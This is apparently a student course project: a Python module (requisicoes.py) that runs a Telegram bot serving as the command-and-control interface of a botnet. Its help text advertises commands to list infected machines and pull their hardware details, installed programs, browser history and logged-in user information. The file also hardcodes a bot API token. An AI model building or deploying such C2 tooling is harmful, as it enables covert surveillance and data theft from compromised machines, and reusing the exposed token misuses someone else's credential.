#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# ifrn/2023.2/programacao_para_redes/projeto/requisicoes.py
# Copyright (C) 2023  Sidney Pedro
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.
#

# Importando bibliotecas
import requests, funcoes, comandos

# Armazenando token do bot (@progredes_c2_bot), endereço da
# API do Telegram e opções do bot
API_TOKEN = "6415239744:AAFAmiRsi_ZEa5OLuW1jny-pyBmYyu2GYZM"
TELEGRAM_API = f"https://api.telegram.org/bot{API_TOKEN}"
OPCOES = ["-h", "-q", "-d", "-p", "-b", "-u", "-l", "-s"]

# Função para salvar a última atualização
def salvar_update_id(update_id: int):
    arquivo = open(f"{funcoes.DIRETORIO_ATUAL}/update_id.txt", "w")
    arquivo.write(f"{update_id}\n")
    arquivo.close()

    return

# Função para obter última atualização e mensagem
def obter_atualizacoes(latest_update_id: int):
    # Realizando requisição à API e, em caso de erro, retorna-se a
    # atualização anterior
    latest_message = None
    updates = requests.get(f"{TELEGRAM_API}/getUpdates?offset={latest_update_id}")
    retorno = updates.json()
    if (updates.status_code == 409):
        print("Erro: outra conexão está sendo estabelecida ao bot!")
        return latest_update_id, latest_message
    elif (updates.status_code != 200):
        return latest_update_id, latest_message
    elif (len(retorno["result"]) == 0):
        return latest_update_id, latest_message

    # Abrindo arquivo de atualização e, em caso de exceção, recria-se
    # e abre-se o mesmo
    try:
        arquivo = open(f"{funcoes.DIRETORIO_ATUAL}/update_id.txt", "r")
    except:
        salvar_update_id(latest_update_id)
        arquivo = open(f"{funcoes.DIRETORIO_ATUAL}/update_id.txt", "r")

    # Lendo arquivo de atualização
    latest_update_id = arquivo.readline()
    arquivo.close()

    # Obtendo última atualização salva e, em caso de exceção,
    # remove-se o aquivo de atualização e retorna-se a atualização
    # anterior
    try:
        latest_update_id = int(latest_update_id)
    except:
        funcoes.remover_arquivo("update_id.txt")
        return latest_update_id, latest_message

    # Lendo última atualização e, se ela não for maior que a última
    # atualização salva, retorna-se a atualização anterior
    message_id = retorno["result"][-1]["update_id"]
    if (not message_id > latest_update_id):
        return latest_update_id, latest_message

    # Atualizando última atualização e mensagem
    latest_update_id = message_id
    latest_message = retorno["result"][-1]
    return latest_update_id, latest_message

# Função para interpretar mensagem
def interpretar_mensagem(message: dict):
    # Lendo ID do chat e da mensagem e montando dicionário de retorno
    chat_id = message["message"]["chat"]["id"]
    message_id = message["message"]["message_id"]
    retorno = {
        "chat_id": chat_id,
        "reply_to_message_id": message_id,
        "parse_mode": "Markdown",
        "text": ''
    }

    # Se não há texto na mensagem recebida, retorna-se
    if (not "text" in message["message"]):
        return retorno

    # Analisando conteúdo da mensagem recebida e respondendo com sua
    # ação correspondente
    message_text = message["message"]["text"]
    tokens = message_text.split()
    if (len(tokens) == 1 and (tokens[0] == "/start" or tokens[-1] == "./c2")):
        retorno["text"] = "./c2 -h"
    elif (tokens[0] != "./c2"):
        retorno["text"] = ''
    elif (tokens[1] in OPCOES):
        retorno["text"] = message_text

    return retorno

# Função para responder mensagem
def responder_mensagem(retorno: dict):
    if (retorno["text"] == ''):
        retorno["text"] = f"""Comando desconhecido!

Digite `./c2 -h` para obter a lista de comandos válidos"""
    elif (retorno["text"] == "./c2 -h"):
        retorno["text"] = f"""Uso: `./c2 [OPÇÃO] [ARGUMENTO]...`
Comando e Controle (C2) da _botnet_ do Projeto de ProgRedes 2023.2.

Opções:
` -h           ` Exibe essa mensagem
` -q ID        ` Finaliza o daemon do servidor ou de uma
`              ` máquina conectada identificada por `ID` (o ID do
`              ` servidor é `0`)
` -d ID        ` Lista informações de hardware de uma máquina
`              ` conectada identificada por `ID`
` -p ID        ` Lista programas instalados em uma máquina
`              ` conectada identificada por `ID`
` -b ID        ` Obtem histórico de navegação dos navegadores
`              ` de uma máquina conectada identificada por `ID`
` -u ID        ` Obtem informações do usuário logado de uma
`              ` máquina conectada identificada por `ID`
` -l           ` Lista de máquinas conectadas (ID's, endereços,
`              ` IP, tempo online, etc.)
` -s AÇÃO HOST ` Reservado

Exemplos:
` ./c2 -h      ` Pede informações do C2"""

    requests.post(f"{TELEGRAM_API}/sendMessage", data=retorno)
    return
